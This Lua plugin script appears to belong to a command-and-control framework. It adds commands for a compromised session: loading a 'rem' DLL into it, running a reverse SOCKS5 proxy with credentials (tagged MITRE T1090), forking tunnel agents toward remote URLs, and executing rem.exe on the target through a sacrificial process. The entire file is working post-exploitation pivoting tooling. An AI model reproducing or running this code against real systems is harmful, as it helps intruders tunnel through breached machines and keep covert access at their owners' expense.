function load_rem()
    local rpc = require("rpc")

    local task = rpc.LoadRem(active():Context(), ProtobufMessage.New("modulepb.Request", {
        Name = "load_rem",
        Bin = read_resource("chainreactors/rem.dll"),
    }))
    wait(task)
end

command("rem_community:load", load_rem, "load rem with rem.dll", "")

function build_rem_cmdline(pipe, mod, remote_url, local_url)
    local link = rem_link(pipe)
    local args = { "-c", link, "-m", mod }
    if remote_url and remote_url ~= "" then
        table.insert(args, "-r")
        table.insert(args, remote_url)
    end
    if local_url and local_url ~= "" then
        table.insert(args, "-l")
        table.insert(args, local_url)
    end
    return args
end

function run_socks5(arg_0, flag_port, flag_user, flag_pass)
    return rem(active(), arg_0,
        build_rem_cmdline(arg_0, "reverse", "socks5://" .. flag_user .. ":" .. flag_pass .. "@0.0.0.0:" .. flag_port, ""))
end

command("rem_community:socks5", run_socks5, "serving socks5 with rem", "T1090")


function run_rem_connect(arg_0)
    rem(active(), arg_0, { "-n" })
end

command("rem_community:connect", run_rem_connect, "connect to rem", "")


function run_rem_fork(arg_0, flag_mod, flag_remote_url, flag_local_url)
    local rpc = require("rpc")
    local task = rpc.RemCtrl(active():Context(), ProtobufMessage.New("clientpb.REMAgent", {
        Id = arg_0,
        Args = { "-r", flag_remote_url, "-l", flag_local_url, "-m", flag_mod },
    }))
    wait(task)
end

command("rem_community:fork", run_rem_fork, "fork rem", "")

function run_rem(flag_pipe, args)
    local session = active()
    local arch = session.Os.Arch
    local rem_path = "proxy/rem.exe"
    table.insert(args, "-c")
    table.insert(args, rem_link(flag_pipe))
    return execute_exe(session, script_resource(rem_path), args, true, 600, arch, "", new_sac())
end

command("rem_community:run", run_rem, "run rem", "")
